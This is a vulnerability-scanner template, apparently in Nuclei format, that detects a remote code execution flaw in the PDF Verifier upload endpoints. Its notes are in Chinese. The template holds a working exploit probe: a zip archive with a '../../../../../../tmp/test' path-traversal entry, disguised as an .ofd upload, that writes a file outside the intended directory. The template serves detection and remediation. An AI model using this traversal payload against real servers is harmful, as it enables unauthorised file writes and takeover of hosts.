id: pdfverifier-rce
info:
  name: PDF Verifier pdfverifier 接口 - 远程代码执行漏洞
  author: Chaitin
  severity: critical
  description: |
    该模板用于检测 PDF Verifier pdfverifier 接口 - 远程代码执行漏洞。该类漏洞通常与危险接口暴露、命令参数拼接、模板解析、反序列化或组件缺陷有关，攻击者可能让服务端执行非预期代码。模板会向 `/pdfverifier`、`/api/pdfverifier` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可在目标服务权限范围内执行命令或代码，进而接管应用所在主机。
    - 成功利用后可能泄露配置、密钥和业务数据，并为横向移动、持久化控制或破坏业务提供入口。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，移除存在已知缺陷的依赖。
    - 限制高危接口的公网访问，增加认证、授权和来源校验，并避免将用户输入传入命令执行、模板解析或反序列化流程。
    - 排查异常进程、计划任务、WebShell、外联连接和新增账号，必要时轮换凭据并重建受影响环境。
  metadata:
    verified: true
    max-request: 2
    vendor: pdfverifier
    product: pdfverifier
  tags: rce,vuln,pdfverifier
variables:
  r1: '{{to_lower(rand_text_alpha(16))}}'
  p1: '{{zip("../../../../../../tmp/test",b"test\r\n")}}'
flow: http(1) || http(2)
http:
  - method: POST
    path:
      - '{{BaseURL}}/pdfverifier'
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{r1}}
    body: |
      ------WebKitFormBoundary{{r1}}
      Content-Disposition: form-data; name="file"; filename="test.ofd"
      Content-Type: image/jpeg

      {{p1}}
      ------WebKitFormBoundary{{r1}}--
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "statusCode") && contains(body, "\\u8BF7\\u6C42\\u6210\\u529F")'
  - method: POST
    path:
      - '{{BaseURL}}/api/pdfverifier'
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{r1}}
    body: |
      ------WebKitFormBoundary{{r1}}
      Content-Disposition: form-data; name="file"; filename="test.ofd"
      Content-Type: image/jpeg

      {{p1}}
      ------WebKitFormBoundary{{r1}}--
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "statusCode") && contains(body, "\\u8BF7\\u6C42\\u6210\\u529F")'
